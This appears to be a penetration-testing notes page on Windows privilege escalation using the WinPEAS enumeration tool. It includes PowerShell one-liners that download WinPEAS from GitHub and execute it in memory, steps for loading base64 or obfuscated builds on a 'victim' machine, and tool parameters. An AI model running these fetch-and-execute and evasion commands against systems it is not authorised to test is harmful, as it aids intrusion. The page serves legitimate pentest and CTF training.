---
description: >-
  Privilege Escalation consists of techniques that adversaries use to gain
  higher-level permissions on a system or network.
---

# Privilege Escalation

<mark style="background-color:red;">This chapter is in-progress.</mark>

<mark style="color:blue;">Check the index on the right to navigate this page more easily.</mark>

## WinPEAS

{% hint style="info" %}
Official Link: [https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

Color Legend:

* Red = special privilege is misconfigured
* Green = some protection is enabled or something is well configured
* Cyan = active user
* Blue = disabled users
* Light Yellow = indicates links
{% endhint %}

Download the [**latest obfuscated and not obfuscated versions from here**](https://github.com/peass-ng/PEASS-ng/releases/latest) or **compile it yourself** (read instructions for compilation).

```powershell
# Get latest release
$url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"

# One liner to download and execute winPEASany from memory in a PS shell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")

# Before cmd in 3 lines
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use

# Load from disk in memory and execute:
$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS.exe")));
[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use

# Load from disk in base64 and execute
##Generate winpeas in Base64:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("D:\Users\user\winPEAS.exe")) | Out-File -Encoding ASCII D:\Users\user\winPEAS.txt
##Now upload the B64 string to the victim inside a file or copy it to the clipboard

 ##If you have uploaded the B64 as afile load it with:
$thecontent = Get-Content -Path D:\Users\victim\winPEAS.txt
 ##If you have copied the B64 to the clipboard do:
$thecontent = "aaaaaaaa..." #Where "aaa..." is the winpeas base64 string
##Finally, load binary in memory and execute
$wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))
[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use

# Loading from file and executing a winpeas obfuscated version
##Load obfuscated version
$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS-Obfuscated.exe")));
$wp.EntryPoint #Get the name of the ReflectedType, in obfuscated versions sometimes this is different from "winPEAS.Program"
[<ReflectedType_from_before>]::Main("") #Used the ReflectedType name to execute winpeas
```

#### Parameter Examples

```powershell
winpeas.exe -h # Get Help
winpeas.exe # run all checks (except for additional slower checks - LOLBAS and linpeas.sh in WSL) (noisy - CTFs)
winpeas.exe systeminfo userinfo # Only systeminfo and userinfo checks executed
winpeas.exe notcolor # Do not color the output
winpeas.exe domain # enumerate also domain information
winpeas.exe wait # wait for user input between tests
winpeas.exe debug # display additional debug information
winpeas.exe log # log output to out.txt instead of standard output
winpeas.exe -linpeas=http://127.0.0.1/linpeas.sh # Execute also additional linpeas check (runs linpeas.sh in default WSL distribution) with custom linpeas.sh URL (if not provided, the default URL is: https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh)
winpeas.exe -lolbas  # Execute also additional LOLBAS search check
```

### Where are my COLORS?!?!?!

The **ouput will be colored** using **ansi** colors. If you are executing `winpeas.exe` **from a Windows console**, you need to set a registry value to see the colors (and open a new CMD):

```
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

\
